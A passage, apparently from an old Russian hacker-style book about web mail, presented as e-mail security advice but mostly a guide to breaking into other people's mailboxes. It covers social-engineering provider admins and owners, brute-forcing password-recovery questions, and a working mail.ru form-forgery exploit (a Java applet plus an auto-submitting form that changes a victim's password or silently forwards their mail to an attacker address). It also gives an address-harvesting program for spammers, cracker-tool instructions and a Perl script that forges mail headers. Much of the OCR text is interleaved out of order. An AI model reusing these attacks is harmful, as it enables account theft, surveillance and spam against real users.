ра с заданным ником, добавили его в контакт лист и узнали его
IP с помощью Твикера ISOAQ. Далее мы юзаем любой сканер для
поиска шаренных ресурсов.
Пример. Мы нашли юзера с ником Vovan, смотрим его IP
(допустим IP=195.146.10.120), запускаем сканер на подсеть
195.146.10.1 195.146.10.255, я уверен что ты найдешь кучу других
юзеров, у которых ресурсы будут расшарены (я брал сканер Net
Tools 2.2).
Я не буду сейчас рассказывать, как парится с запароленны
ми ресурсами, ты найдешь кучу хостов без пароля.
Вот в принципе и вся система! Далее все происходит зано
во, т.е. ты берешь «следующего» Vovan’a и тем же макаром иссле
дуешь.
Несколько самых простейших способов «взлома»
мыла
1. Один из самых простых. Пишите владельцу мыла какое
нибудь письмо, все равно с каким содержанием, но лишь бы хо
зяин мыла ответил. Если это какой нибудь «чудо крутой хакер»,
то что нибудь типа: «Слушай, а ты в натуре можешь сайт сло
мать??? http://www.microsoft.com — не твоя работа???» и так далее
в этом духе... Если web мастер, то что нибудь типа: «Мне так нра
вится, как ты пишешь! А у тебя JAVA скрипта нету, что б он там
что то делал???» По фигу ЧТО, главное чтоб от него назад ответ
пришел. В принципе, эта вся процедура была только для того,
чтоб узнать ИМЯ_ФАМИЛИЮ (или ник) и место расположения
«клиента». То бишь, если по этому мылу находится аська, то смо
трим инфу в аське, город (если не прописан в аське, то по IP),
имя, возраст и зип. Потом пишешь админу мыльного сервака (у
любой мыльной системы есть админ, и у 99% www шные серве
ра), обычно это адреса admin@provider.com и support@provider.
E mail «безопасная»
57
com. Так вот... Пишешь письмо (очень желательно через www
браузер, например, от www.mail.ru или www.hotmail.com) и через
анонимную проксю. Это для того, чтоб в заголовке пакета был IP
прокси. Так... для секьюрити... Так вот. В теле письма пишешь,
что так и так... Злобные хакеры украли у тебя мыло, а тебе очень
нравится их служба, сервис, скорость работы, безглючность и все
такое... Что ты никогда не променяешь ихний сервис, и что они
вообще самые крутые мыльщики! Указываешь ИМЯ, ФАМИ
ЛИЮ, ЗИП, ГОРОД, Телефон (от балды) или что они там еще
просят... Естественно назад придет письмо, что «Информация не
совпадает с введенной при регистрации и все такое...». Но ты будь
настойчивей! Пиши назад, что «то что ты им выдаешь — единст
венная верная информация о твоем аккаунте»! И повторяешь им
ту же инфу, что и первый раз. И так, пока админ не сломится...
но не забывай каждый раз расхваливать их сервис! Обычно раз на
7 10 прокатывает... У меня был даже раз случай, когда один бур
жуйский админ «отдал» мне мыло, где (как потом оказалось) ин
фа, прописанная в мыле, ВООБЩЕ не соответствовала той, что я
ему ВЫДАВАЛ якобы за владельца аккаунта!
Так что дерзайте, тут главное БОЛЬШЕ фантазии и упорст
ва! Но и о безопасности не забывайте!
2. Второй способ. Посложнее, но все равно общедоступный.
Почти в каждом мыльном сервисе есть служба что типа «Foggot
Password?» Так вот... Заходим туда (предварительно не забыв из
менить атрибуты файла cookie_для_этой_службы на ReadOnly).
Там обычно ОЧЕНЬ простые вопросы... Если повезет, то вопрос
будет (к примеру на мыло.ру) «В каком городе ты родился?» В
первом способе описано, как узнавать город юзверя по мылу, так
что на этом не будем останавливаться. Ну и вопросы бывают «ку
стомайзские» типа «2000», ответ обычно такой же... А вот если
что нибудь типа «Как зовут мою собаку?», то читай ниже...
Открываем эту страницу и там в HTML просмотре ищем
строчку типа:
form action="/cgi bin/3970.dll?secquest"
58
E mail «безопасная»
Безопасность E mail
Безопасность E mail
Так вот... Если URL мыла http://www.mail.ru, то полный
URL места куда отправляется «секретный ответ» будет
http://www.mail.ru/cgi bin/3970.dll?secquest. Этот URL вводишь
вместе с идентификатором Вопроса в программу типа WebCrack
2.0. Идентификатор вопроса находится там же где и form
action=/cgi bin/3970.dll?secquest, только чуть дальше. Потом в эту
программу или загружаешь встроенный wordlist c паролями или
пишешь свой по конкретной тематике, это зависит от вопроса. И
вперед! Запускаешь и ждешь...
Так что тут тоже нужно терпение и хоть базовые знания
HTML.
Вы наверное замечали, что на некоторых сайтах при попыт
ке нажать правую кнопку мыши, например, для того, чтобы со
хранить понравившийся фон или рисунок, выскакивала надпись,
типа: «Фигушки!!!» или «Вход воспрещен». Вы не знаете как это
обойти? Я скажу вам очень простой, но не очень удобный способ,
как это сделать. Для начала вы должны скачать эту страничку к
себе на винт, потом переименовать HTML (HTM) в TXT. Пере
именовали? Молодцы! А теперь нажмите F4, наведя курсор на
файл. Далее найдите Java Script в этом файле и удалите его. Те
перь переименуйте обратно в HTML и на здоровье пользуйтесь!!!
Некоторые методы технического взлома
почтового ящика
Outlook Express 5. Первые два аргумента, похоже, соответствуют
действительности, а о безопасности поговорим чуть ниже.
Здесь будет рассмотрен один из вариантов технического
подхода к вскрытию почтового ящика, основанного на совмест
ном использовании недоработок современных браузеров, принци
пиальных недостатках CGI, и ошибках в политике безопасности
почтовых служб. Именно он чаще всего применяется в атаках на
Web почту. Для «конкретности», будет описан найденный авто
ром метод «захвата» или «подслушивания» пользователя популяр
ной в России системе mail.ru и способ защиты.
Принципиальные недостатки безопасности
WWW почты
Ненадежность обычной почтовой программы определяется
безграмотностью её написания.
Браузер же как система прочтения почты изначально недо
статочно безопасен, поэтому создатели почты вынуждены нала
гать ограничения на тэги, используемые в письмах (<script ...>,
<iframe>). Как правило, встроенный фильтр просто удаляет «не
безопасные» с его точки зрения инструкции. Принципиальных
недостатков у подобного подхода два: слишком строгие фильтры
могут повредить само письмо, да и трудно предугадать заранее, на
что способна безопасная с виду конструкция. Тем не менее, имен
но на фильтрации основаны большинство существующих почто
вых систем.
В последнее время значительную популярность обрели поч Самый же уязвимый элемент — это способ задания пользо
                                                товые системы на основе WWW Интерфейса (www.hotmail. com, вательских настроек и пароля. Они, как правило, задаются с по
                                                                              www.mail.com, www.netscape.net в России — www.mail.ru). Web мощью CGI форм (как наиболее распространённого стандарта)
                                                                                       почту «местного значения» также предлагают провайдеры, рабо по тем же каналам, что используются для работы с почтой, и мо
                                                                                                                                           тающие по схемам «Internet Кард» или «Internet в кредит». Чест гут быть вызваны любым членам сети, сумевшим подделать IP и
                                                                                                                                                                               но говоря, автору совершенно непонятны причины такого успеха. cookies пользователя, или (что гораздо проще) временно захватив
                                                                                                                                                                                                                                   Сторонники подобных систем обычно заявляют о простоте и шим контроль над браузером.
                                                                                                                                                                                                                                                                                   удобстве пользования, при большей безопасности, ссылаясь на ог 
                                                                                                                                                                                                                                                                                                                                        ромное количество вирусов и печальный пример MS Outlook и MS 
E mail «безопасная» 60
59
E mail «безопасная»
Безопасность E mail
Безопасность E mail
Технология атаки
Итак, мы решили перехватить контроль у пользователя xxxx
почтовой системы с Web интерфейсом, например, yyyy.zz. Толь
ко убедитесь, что он действительно пользуется web интерфейсом,
а не читает почту через pop3 сервер или пользуется форвардин
гом.
Заводим почтовый ящик на этом же сервисе и в первую оче
редь смотрим, как задаются и изменяются пароль и прочие наст
ройки. На mail.ru (и многих других) это делает обычная форма,
результаты заполнения которой передаются в CGI скрипт cgi
bin/modifyuser?modify.
Для идентификации пользователя, похоже, используется
скрытое поле:
<input type="hidden" name="Username" value="intst1">
Нам предоставляется возможность изменить:
■
имя пользователя:
<input type="text" name="RealName" value="A. V. Komlni">
■
адрес пересылки (форвардинга) и возможность
сохранения почты при этом:
<input type="text" name="Forward" value="...">
<input type=checkbox name="Flags.DoNotKeepMail" >
■
пароль:
<input type="password" name="Password"
value="****************">
<input type="password" name="Password_Verify"
value="****************">
Попробуем сформировать соответствующий файл, задав в
скрытом поле имя интересующего нас пользователя и отослать
форму, т.к. CGI, увы, не проверяет место нахождения формы за
проса.
<form method=post action="http://koi.mail.ru/cgi bin/
modifyuser?modify">
E mail «безопасная»
61
Не получилось. Быть может, в интересующей вас системе
этого окажется достаточно, а в mail.ru такие шутки не проходят.
Значит, пользователь идентифицируется с помощью cookies
или, хуже того, IP. Пробуем вручную отредактировать cookies —
результат тот же. Следовательно, эту форму должен отослать сам
пользователь.
Наиболее простой способ захвата контроля над браузером —
внедрение <script> и &{ ... } конструкций в письмо — давно уже
пресечён с помощью фильтров почти всеми, и mail.ru в том чис
ле. Тем не менее попробуйте, чем чёрт не шутит. Если тэги раз
решены, то фильтрация самого javascript иногда может быть обой
дена при помощи средств динамической генерации кода.
Неплохой результат иногда дают конструкции вида:
<тег [XX]SRC=...>
Например,
<IMAGE LoSrc="javascript..."...>
<IFRAME SCR="about: <script...> ...">
для IE и
<ilayer src="mocha:...">
для NC. («mocha» — это старый, всеми позабытый аналог
модификатора «javascript», сохранившийся в NC). Вообще, чем
реже используется тот или иной тэг, тем больше вероятность, что
разработчики забыли его отфильтровать... Недостаток этого под
хода в том, что требуется знать тип и версию используемого бра
узера.
К сожалению (вернее к счастью), у программистов mail.ru
память хорошая. В конце концов это их и подвело. Наверное, они
(да и не только они, похоже) читали «умные» книжки, запомнив,
что Java — одна из самых безопасных технологий в сети. Поэто
му и разрешили тэг <Applet...>.
В стандарте Java есть класс AppletContext (зачем?!), позволя
ющий нам открывать новые окна или менять текущие.
URL myURL=new URL("http:...editprofil.html");
62
E mail «безопасная»
Безопасность E mail
Безопасность E mail
getAppletContext().showDocument(myURL,"_self");
getAppletContext().showDocument(myURL,"newwin");
На любой общедоступной страничке размещаем файл edit
profil.html (содержащий требуемую форму), прописываем к нему
путь в апплете, который размещаем там же и высылаем пользова
телю письмо, содержащее вызов апплета. Этот эксплойт не зави
сит от браузера, одинаково «хорошо» работая в IE и NC.
<applet
code=readr.class
name=readrie
codebase="_ПУТЬ_/"
width=320
height=240 >
<B> SET Java On</B>
</applet>
}
editprofil.html
(не забудьте отредактировать ИМЯ_ПОЛЬЗОВАТЕЛЯ и
НОВЫЙ_ПАРОЛЬ)
<html>
<body>
<form method=post action="http://koi.mail.ru/cgi bin/modi
fyuser?modify">
<input type="hidden" name="Username" value="
ИМЯ_ПОЛЬЗОВАТЕЛЯ ">
<input type="text" name="RealName" value="A. V. Komlni">
<input type="text" name="Forward" value="">
<input type="password" name="Password" value=" НОВЫЙ_ПАРОЛЬ
">
<input type="password" name="Password_Verify"
value=" НОВЫЙ_ПАРОЛЬ ">
<input type=checkbox name="Flags.DoNotKeepMail" >
Не сохранять почту при пересылке<br>
readr.java (не забудьте отредактировать _ПУТЬ_)
import java.applet.*;
import java.awt.*;
import java.net.*;
<input type="submit" value="Сохранить"> <input type="reset"
value="Восстановить">
</form>
<SCRIPT LANGUAGE="JavaScript">
document.forms[0].submit();
</script>
public class readrie extends Applet
{
public void paint(Graphics g)
{ try {
</body>
</html>
Письмо можно сформировать просто присоединением
(attach) HTML файла (в Netscape Messenger, например) содержа
щего необходимые тэги. Присоединенный в Messenger’е HTML
файл mail.ru откроет автоматически.
URL myURL=new URL("_ПУТЬ_editprofil.html");
getAppletContext().showDocument(myURL,"_self");
} catch (Exception e) {
g.drawString("Error", 10, 10);
}
}
E mail «безопасная»
63
64
E mail «безопасная»
Безопасность E mail
Безопасность E mail
Как только абонент попытается прочитать письмо, выпол
нится апплет, и через несколько секунд форма будет отослана от
имени жертвы.
Вот, в принципе, и всё. Пользователю присвоен новый па
роль. Если мы хотим «просто подслушивать» пользователя, в зна
чение полей Password необходимо внести 16 звёздочек, а в поле
Forward — куда отсылать копии. Это довольно рискованный ва
риант: пользователь может случайно заглянуть в настройки и за
метить адрес.
<input type="text" name="Forward" value="spy_addr@xxxx.zz">
<input type="password" name="Password"
value="****************">
<input type="password" name="Password_Verify"
value="****************">
Макияж...
Не стоит, конечно, проводить всю эту процедуру перед гла
зами пользователя (может он ещё не отключил подтверждение на
отправку форм или успеет запомнить разглядеть и запомнить но
вый пароль). Разумнее переадресовать апплет на какой нибудь
файл содержащий frameset:
<FRAMESET COLS="99%,1%">
<FRAME SRC="zastavka.html" NAME="v1">
<FRAME SRC="editprofile.html" NAME="w1">
где zastavka маскирует письмо под безобидную рекламу или дру
жеское письмо, а editprofile выполняется в невидимом фрейме.
Защититься от этой атаки как всегда просто. Отключить
Java, а лучше, отказаться от использования Web интерфейсов. Тот
же mail.ru предлагает и форвардинг и pop сервера. Экономия на
настройке приносит проблемы с безопасностью не только адми
нистраторам больших сетей, поверьте.
Составляем список абонентов сервера
Заветной мечтой всех спамеров мира является список (база)
абонентов. Недаром, в их среде постоянно ходят слухи о каких то
почтовых серверах, поддерживающих команду finger. Часто на фо
руме можно видеть крик души:
"Нужна база е мейлов по заграничным и Московским сайтам
$$$ — Вася 02:53:36 06/1/2000 (0)"
Нередко почтовые Web сервера могут «бесплатно» предо
ставить подобную информацию. Метод её получения довольно
прост. При легальной работе с почтовым ящиком запоминаем ад
реса CGI скриптов, ответственных за смену и чтение параметров
пользователей. Потом вызываем их без параметров (форм). Впол
не вероятны ошибки в скриптах, при которых они отработают с
последними занесёнными (или использующимися в текущий мо
мент) именами пользователей.
По окончании смены паролей лучше сымитировать сбой т.к. Конечно, шансы на то, что параметры можно изменить, ну
                                              в течении сеанса пользователь может исправить пароль. В IE под левые, а вот сообщение об ошибке доступа вполне может содер
                                                                                                Win 95/98, например, достаточно выполнить скрипт: жать имя пользователя, как это происходит на mail.ru. При обра
                                                                                                                                 open("javascript:open(window.location)"); щении к тому же http://koi.mail.ru/cgi bin/modifyuser?modify
                                                                                                                                 приводящий к бесконечному размножению окон, требующему пе выдаётся сообщение вида:
                                                                                                                                                                                   резагрузки. Само письмо лучше отослать (на случай неудачи) от Настройки пользователя mnebojsa@mail.ru
                                                                                                                                                                                                                                     анонимной службы рассылки писем. Ошибка.
                                                                                                                                                                                                                                                                                                       Не заполнены необходимые поля.
                                                                                                                                                                                                                                                                                                                                При следующем обращении «сдастся» следующий пользова
                                                                                                                                                                                                                                                                                                                                                                              тель или «@/» если таковых не окажется. Осталось исследовать
                                                                                                                                                                                                                                                                                                                                                                                                                              внутреннюю структуру ответа, да написать программу, повторяю
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 щую подобные запросы и фильтрующую ответ в поисках нужной
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 информации. Лучше запускать её в часы пик:
E mail «безопасная» 66
65
E mail «безопасная»
Безопасность E mail Безопасность E mail
import java.io.*; Теперь больной манией величия «хаксор» вполне может со
import java.net.*; здать программу, автоматически рассылающую письма ловушки
import java.util.*; отбирающие почтовые ящики, практичный спаммер — рекламу, а
                                                                     конкуренты — сообщение, вида: «бесплатный сервис mail.ru будет
                                                                                                                   с начала месяца прекращён, воспользуйтесь xxxx.ru» или всё вме
                                                                                                                                                                сте.
public class getname {
public static void main(String args[]) {
String nextline;
try
{
URL mailserv= new URL
("http://koi.mail.ru/cgi bin/modifyuser?modify");
for (int i=1;i<=10000;i++)
{
DataInputStream input = new
DataInputStream (
mailserv.openConnection().getInputStream());
nextline=input.readLine();
nextline=input.readLine();
nextline=input.readLine();
// Нужный нам адрес — в третьей строке выходного
// документа
System.out.println( nextline);
input.close();
}
}
catch(Exception ioe)
{
System.out.println(ioe.toString());
}
}
};
Вызовы команд вида (в среде JDK):
:javac getname.java — компилируем файл
:java getname > userlist.txt
занесут в файл userlist.txt примерно 10000 e mail адресов.
E mail «безопасная»
67
Урви и ты кусок чужого мыла!!!
Думаю, что тема не требует лишних преамбул. Будут рассмо
трены два способа:
■ социальная инженерия
■ применение специальных программ.
Социальная инженерия (пример с mail.ru). Идёшь в рубрику
забыл пароль и смотришь секретный вопрос хозяина интересую
щего тебя мыла. Затем знакомишься с хозяином (я обычно под
видом прелестной девушки — чёрные мысли в сторону) и в про
цессе переписки/разговора, можно узнать ответ почти на любой
«секретный» вопрос (любимое блюдо, имя собачки, девичья фа
милия жены или рост). Если тебе хочется почитать письма своих
друзей, то можно поступить проще, если не знаешь ответа на се
кретный вопрос (кто его знает, как безграмотный друг написал),
то, для таких случаев есть специальная анкета (типа той, что при
регистрации), заполнить которую, зная человека, не составит тру
да (Фамилия, имя, возраст, страна, город и.т.д.), самое сложное
— указать примерную дату регистрации мыла, но если постарать
ся и это разрешимо (проще всегда узнавать ответ на один и тот
же вопрос, чем придумывать фуфло для каждого в отдельности).
Другой метод — использование специальных программ. Ни
же приведено их полное описание, так как те функции, которые
они в себе несут помимо подбора пароля к мылу, оставить кото
рые без внимания рука не поднимается.
68
E mail «безопасная»
Безопасность E mail
Безопасность E mail
Ну вот и пройден краткий курс молодого бойца по WWW
WWWHack 1.942
Главные плюсы перед xavior — простота в настройке, неме
ренное количество функция (даже подбор пароля к webforme). Эту
программу посмотреть ты просто обязан. Теперь подробнее.
Функции
■ 1. Авто Upgrade
■ 2. «Двигатель» мыши
■ 4. Перебор паролей на запароленной страничке
■ 5. Перебор паролей на WWW форме
■ 
Другая программа xavior, обладает лишь большей скоро
стью, но настройка у неё гораздо муторнее.
6. То же самое на E mail и FTP
■ 
xavior
Вот запустил ты енту программу на своей тачке и видишь
уродство и говоришь себе: «Блин, что это за убожество, отстой,
ни картинок тебе, ни нормального ХЕЛПА...» Но это всё пока ты
не понимаешь ценности этой вещи. Ну вот, например, я тебе на
пишу неполный список того, что ты можешь сделать с помощью
этой программы:
3. Атака на сервер
■ 
hack.
7. DNS Lookup
■ ■ 
1. Жмешь File ➪ Check for updates и программа автоматиче
ски скачивает откуда то апдейт к себе любимой и сразу его уста
навливает (это не троян и не вирус — не дергайся!) и таким об
разом у тебя постоянно новая версия!
поломать техническую поддержку своего провайдера
                                           и раздобыть себе халявный аккаунтик и делать далее
                                                                                     всё, что твоей хацкерской душеньке угодно (даже
                                                                                                                           продать его);
■ 
Теперь подробней о каждой из этих фич:
подобрать пароль к мылу своего заклятого врага и
                                        поотсылать от его мыла вирус или лошадку;
раздобыть себе аккаунтик к порнушке и даже если
                                       ты таким не увлекаешься (может ты этакий Казанова
                                                                               и на этих баб, тем более в голом виде уже смотреть
                                                                                                                     не можешь, тошнит), то есть много людей, готовых
                                                                                                                                                         за такой аккаунтик сделать ТтАаКкОоЕе!!!...уже про
                                                                                                                                                                                                 верено...
2. Эта фича будет периодически двигать твою мышу (как ей
скажешь). Очень тебе поможет если ты зарабатываешь деньги в
сети у спонсоров. Находится в Tools ➪ MouseMove.
3. Denial of Service атака (только если ты сидишь на выде
ленке с каналом не менее 2 мегабит).
4, 5, 6. Думаю не требует объяснений, все лежит в меню
Access.
Единственное по моему важное замечание — если ты ве
дешь атаку на web форму, то ОБЯЗАТЕЛЬНО надо указать, какое
слово лежит в отказе, а тем более чтобы это слово не содержалось,
если пароль принят!!!
Ну и многое другое, надеюсь ты сам понимаешь...
Ну, хорошо, приступим к описанию самой программы. Вот
запустил ты её и смотришь... а что же тут делать, а вот сейчас я
это и объясню...
Перед тобой менюшка с 6 закладками, о каждой по порядку:
1. Information — это закладка, в которой есть такие опции
7. Если тебе надо выяснить все о твоей жертве — это тебе как:
                                            поможет узнать очень многое! 
E mail «безопасная» 70
69
■
Usernames File — это файл, в котором задаются
логины
E mail «безопасная»
Безопасность E mail
Безопасность E mail
■ Passes File — это файл, в котором задаются пароли ■
■ Currently Position Filename — это файл с расширением И вот последнее в этой закладке:
                         *.xvp. Вот это и есть хорошая фишка этой 
                                                    программульки, это значит, что ты можешь долбать 
                                                                                            спокойно какой то мыл и в нём сложный пасс и 
                                                                                                                               требует долгого и упорного долбления, а тут как раз 
                                                                                                                                                                         время ночной халявы кончается.И что делать, ты 
                                                                                                                                                                                                               думаешь, а ничего не надо, будет всё снова начинать! 
                                                                                                                                                                                                                                                        Программа запомнит позицию долбления и потом 
                                                                                                                                                                                                                                                                                               начнёт с неё. 
Далее идёт status, то есть online или offline. В правом углу
идёт всякая инфа типа номера сессии, попыток в секунду, остав
шееся время и т.п. Внизу есть 2 окна: первое — всякая инфа не
нужная, позиция долбинга, второе окно — это списки логинов и
пассов, которые прошли или заканали... кто как называет.
2. Закладка General Options — это собственно говоря все
опции, то есть:
■
Target(Adress/IP) — ну это адресок того, что
собираемся долбить. Port — это порт по которому
долбится будем, по умолчанию 80 (HTTP)
Scripting — это по скрипту
■ Checking Method — метод проверки
■ Loop throught passwrds file once for every user — это
        прыгать по Пассам на первый Логин, потом на
                                          второй Логин и опять прыжки по Пассам
■ Make passwrd equal to username — это, как я
            понимаю, программа берёт первый Пасс и прыгает
                                                  по Логинам, вроде так
■ Brute Force all character combinations — вот это самая
                рульная вещь, то бишь подбор по буквам
3. Закладка Scripting — установки скрипта.
4. Закладка Mutators — это мутаторы, с их помощью мож
но, например, сказать программе чтобы юзала Пассы и Логины
только в маленьких буквах.
5. Закладка Brute Forcing — установки Брут Форса или на
боры символов.
6. Закладка Advanced — вот нужная в натуре вещь, поподроб
ней:
■ Directory/File (For WEB servers) — ну а это папка на
                  серваке куда долбится будем, по умолчанию /secure
■ Program to masqurade as... — это подо что программа
                          шифруется
■ ■ Use WWW Proxy Web PROXY adress Port — это
            использование прокси сервера, вещь архинужная и
                                                    архиважная! Но вот пока не могу понять, почему же
                                                                                          по умолчанию она отключена
Number of Sesions — это количество сессий ■ Далее надо поставить галочку на Auto Save Position every 100 Sleep between multiple sessions... — пока сам понять не
                                                                                              attemps. Потом идёт выбор, куда же именно на серваке долбится могу на фига оно надо?
                                                                                                                                         будем, то есть: 
■ Minimize To Tray — без комментариев...
■ Use timeouts — это время отдыха программы между
                                 долбингом, советую отключить вообще
■ Log Accepted Names/Passes to "accepted.log" —
     записывать удачные Логины и Пассы в этот файл.
■ Standart HTTP basic Authentication — это стандартная
                   проверка Логин\Пасса
■ CGI BIN/POST — это определение Пасса\Логина по
                                CGI и в Формах
E mail «безопасная»
71
72
E mail «безопасная»
Безопасность E mail
Безопасность E mail
Теперь покажем все на примере: вот например, есть ПРОВ
и я знаю ЛОГИН (если у юзверя есть мыло, то адрес до @ и есть
как всегда ЛОГИН) и знаю, что Пасс у него состоит где то из 6
знаков. Мутим раз — берём Notepad и пишем там Логин, напри
мер, superlamer, то бишь мыло у него будет примерно такое: super
lames@megaprov.com. Дальше берём любой генератор паролей и
задаём ему сгенерировать 1000 паролей с большими и маленьки
ми буквами и с цифрами... Есть??? Молодец!!!
Мутим два — осталось настроить программу и в путь!!! Зна
чит ставим в программе тот именно файл с Логином, который мы
там писали (superlamer), подставляем файл с Пассами, которые
нам добротно сгенерировала программа генератор паролей. Даль
ше ставим адрес, например, www.users. superprov.com, отключаем
тайм аут, включаем прокси (даже если у тебя уже стоит прокси,
всё равно включи, как говорится, «Оперативкой КОМП не испор
тишь!», ставим галочку на log accepted..., указываем файл для со
хранения попыток, чтобы не начинать при обрыве связи всё с на
чала, и ставим «галку» в закладке General Options на Auto Save
Posichion every 100 attempts!!!
В Сети существует множество служб, предоставляющих ус
луги подобного рода (например, proxy серверы, анонимайзеры),
но многие анонимайзеры явно указывают на желание отправите
ля остаться неизвестным, а по поводу анонимности некоторых
proxy серверов меня терзают смутные сомнения.
Одно из возможных решений проблемы заключается в ис
пользовании программы, разработанной специально для аноним
ной рассылки писем, которая исполнялась бы не на компьютере
отправителя, а помещалась на удаленный сервер.
На языке Perl такая программа могла бы выглядеть прибли
зительно так:
use Socket; ·
my($mailFrom) = 'KPNC@APORT.RU'; ·
my($MailTo) = 'KPNC@APORT.RU';
socket(SMTP, PF_INET(), SOCK_STREAM(), 6);
connect(SMTP,sockaddr_in(25,inet_aton("mail.aport.ru")));
recv(SMTP, $buffer, 200, 0);
print "$buffer\n";
Всё, ты готов к ворованию аккаунта. Идём в меню Actions
(это там вверху) и жмём GO!!!
send(SMTP, "HELO kpnc\n",0);
print ">HELO\n";
Маленькие хитрости твоего мыла
Это только кажется, что в Internet так легко затеряться, на
самом же деле, любое ваше действие оставляет долго не заметае
мые следы... Но как поступить, если возникает необходимость от
править (или получить) письмо и при этом остаться полностью
анонимным?
my($buffer) = @_;
recv(SMTP, $buffer, 200, 0);
print "$buffer\n";
send(SMTP, "MAIL FROM: <$mailFrom>\n",0);
print ">MAIL FROM:<$mailFrom>\n";
recv(SMTP, $buffer, 200, 0);
print "$buffer\n";
Большинство серверов исходящей почты определяют IP ад
рес отправителя сообщения и вставляют его в заголовок. Конеч
но, IP адрес это еще не сам отправитель (которого пойди найди),
но иногда возникает желание остаться полностью анонимным.
send(SMTP, "RCPT TO: <$MailTo>\n",0);
print ">RCPT TO: <$MailTo>\n";
E mail «безопасная»
73
74
E mail «безопасная»
Безопасность E mail
Безопасность E mail
recv(SMTP, $buffer, 200, 0); нений с другими узлами сети. Перечисленным требованиям удов
print "$buffer\n"; летворяет, например, hobbiton.org и некоторые другие бесплатные
                                                             сервера.
send(SMTP, "DATA\n",0); Для размещения скрипта на сервере лучше всего воспользо
print ">DATA\n"; ваться ftp протоколом, а запустить его из telnet сессии проще все
recv(SMTP, $buffer, 200, 0); го так: «perl имяфайла.pl».
print "$buffer\n"; 
Для облегчения понимания этот пример не имеет никаких
изменяемых настоек и все данные прописаны непосредственно в
теле программы.
send(SMTP, "From: Kris Kaspersky\n", 0);
print ">From: Kris Kaspersky";
print "\n\n";
send(SMTP, "Subject: Test\n", 0); ·
print ">Subject: Test\n";
send(SMTP, "Hello, KPNC!\n", 0);
print ">Hello, KPNC!\n";
send(SMTP, "\r\n.\r\n",0);
print "\r\n.\r\n";
recv(SMTP, $buffer, 200, 0);
print "$buffer\n";
send(SMTP, "QUIT\n",0);
print ">QUIT\n";
recv(SMTP, $buffer, 200, 0);
print "$buffer\n";
close(SMTP);
Приведенный пример позволяет отослать только одно пись
мо по указанному адресу. На самом же деле, если программа мо
жет отправить одно письмо, то сумеет и десять, стоит только до
полнить ее циклом (Например, бесконечным).
Заголовок письма, отправленного с ее помощью на ящик
«kpnc@aport.ru» (или по любому другому адресу) должен выглядеть
приблизительно так:
From kpnc@aport.ru Mon Jun 05 11:51:53 2000
Received: from hobbiton.org ([216.161.239.42] helo=kpnc)
by hearst.mail.ru with smtp (Exim 3.14 #3)
id 12yrfs 000KGD 00
for KPNC@APORT.RU; Mon, 05 Jun 2000 11:51:53 +0400
From: Kris Kaspersky
Subject: Test
Message Id: < E12yrfs 000KGD 00@hearst.mail.ru >
Date: Mon, 05 Jun 2000 11:51:53 +0400
В заголовке содержится IP адрес сервера, выполнившего
скрипт, но нет никакой информации о подлинном отправителе
этого сообщения (за исключением данных, которые он пожелал
оставить сам). Немного усовершенствовав предложенную про
грамму, можно построить собственный анонимайзер, позволяю
щий его создателю (а, возможно, и другим пользователям) рассы
лать анонимные сообщения и при этом гарантированно
оставаться анонимом.
Скрипт необходимо разместить на сервере, который поддер Однако технически возможно фиксировать IP адреса всех
                                                живает удаленное выполнение программ, разрешает telnet вход, пользователей, подключившихся к hobbiton.org (да, так, собствен
                                                                                              имеет в наличие интерпретатор Perl и допускает установку соеди но, и происходит, — этот сервер ведет протоколы всех действий
                                                                                                                                                                                                                                                                 пользователя) и запустивших скрипт рассылки на выполнение.
                                                                                                                                                                                                                                                                                                                  Поэтому, отправителю, стремящемуся остаться абсолютно неиз
E mail «безопасная» 76
75
E mail «безопасная»
Безопасность E mail
Безопасность E mail
вестным, необходимо найти такой сервер, который бы не вел ни
каких протоколов. Другое решение заключается в использовании
нескольких десятков узлов, последовательно пересылающих
скрипт (или команду на его выполнение) друг другу. Если хотя бы
один из узлов этой цепочки не регистрирует всех подключений,
то установить отправителя окажется невозможно.
Кроме сокрытия анонимности отправителя, скрипт может
использоваться для фальсификации (или уничтожения) заголов
ков писем. Например, можно создать видимость, что сервер, от
правивший письмо, всего лишь транзитный узел пересылки, а
«настоящий» отправитель находится совсем — совсем в другом
месте.
mail.pets.ja, и вряд ли обратит внимание на ретрансляторы, нахо
дящиеся выше. Выявление истинного получателя можно значи
тельно затруднить, если не класть письмо непосредственно в поч
товый ящик клиента, а пересылать его через несколько
транзитных серверов. Если задействовать несколько десятков уз
лов и вставить в письмо несколько десятков подложных строк
«Received», то установить истинного отправителя сообщения ста
нет практически невозможно, вернее сказать, нецелесообразно.
Однако грубая подделка заголовка облегчает выявление
фальсифицированных полей. Основные ошибки, по которым лег
ко узнается подлог, следующие: указанных адресов серверов во
обще не существует в природе; стиль заполнения сервером поля
«Received» отличается от используемого злоумышленником; ре
альное время пересылки писем сервером на порядок ниже (или
выше), чем это следует из заголовка письма.
Для этого достаточно вставить в заголовок одно (или не Причем по «внешнему виду» идентификатора трудно (не
                                             сколько) полей «Received», например, так «Received: from возможно) сказать каким образом он был получен. Для этого не
                                                                       mail.pets.ja» (конечно, это очень грубая подделка, но в качестве обходимо изучить исходные тексты сервера (если они доступны)
                                                                                                                примера вполне сойдет). Модифицированный вариант скрипта или дизассемблировать машинный код (если исходные тексты вне
                                                                                                                                                                 отличается от оригинальной программы следующими строками: досягаемости). В следующем заголовке приведены примеры двух
                                                                                                                                                                                                                    send(SMTP, "Received: from mail.pets.ja\n", 0); 
                                                                                                                                                                                                                    print ">Received: from mail.pets.ja"; 
                                                                                                                                                                                                                    Заголовок письма, отправленного с его помощью, должен 
                                                                                                                                                                                                                                                                 выглядеть приблизительно так: 
                                                                                                                                                                                                                                                                                           From kpnc@aport.ru Thu Apr 06 10:57:30 2000 
                                                                                                                                                                                                                                                                                           Received: from [209.143.154.93] (helo=kpnc) 
                                                                                                                                                                                                                                                                                           by camel.mail.ru with smtp (Exim 3.02 #107) 
                                                                                                                                                                                                                                                                                           id 12d6EL 000NmZ 00 
                                                                                                                                                                                                                                                                                           for KPNC@APORT.RU; Thu, 06 Apr 2000 10:57:30 +0400 
                                                                                                                                                                                                                                                                                           Received: from mail.pets.ja 
                                                                                                                                                                                                                                                                                           From: Kris Kaspersky 
                                                                                                                                                                                                                                                                                           Subject: Test 
                                                                                                                                                                                                                                                                                           Message Id: < E12d6EL 000NmZ 00@camel.mail.ru > 
                                                                                                                                                                                                                                                                                           Bcc: 
                                                                                                                                                                                                                                                                                           Date: Thu, 06 Apr 2000 10:57:30 +0400 
